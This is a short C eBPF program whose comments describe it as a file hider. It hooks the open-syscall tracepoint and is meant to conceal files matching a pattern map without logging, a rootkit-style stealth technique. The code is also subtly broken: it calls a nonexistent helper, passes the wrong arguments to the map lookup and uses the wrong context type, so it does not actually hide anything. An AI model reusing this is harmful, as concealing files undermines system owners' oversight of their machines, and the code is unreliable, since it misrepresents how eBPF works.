#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/fs.h>
#include <linux/ktime.h>

struct file_info {
    char name[256];
};
// file hider that hooks into the sys_enter_open tracepoint to intercept open file sys call
//checks the file name against a pattern map 
//patterns need to be insterted 
//if match is found file is" hidden" 
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, char[256]);
    __type(value, int);
} patterns SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_open")
int handle_open(struct pt_regs *ctx) {
    struct file *file = (struct file *)PT_REGS_PARM1(ctx);
    char name[256];
    int len = bpf_get_str_from_file(file, name, sizeof(name));
    if (len > 0) {
        int hidden = 0;
        bpf_map_lookup_elem(&patterns, name, &hidden);
        if (hidden) {
            // File is hidden, return success ,w/o logging 
            return 1;
        }
    }
    return 0;
}

char _license[] SEC("license") = "GPL";
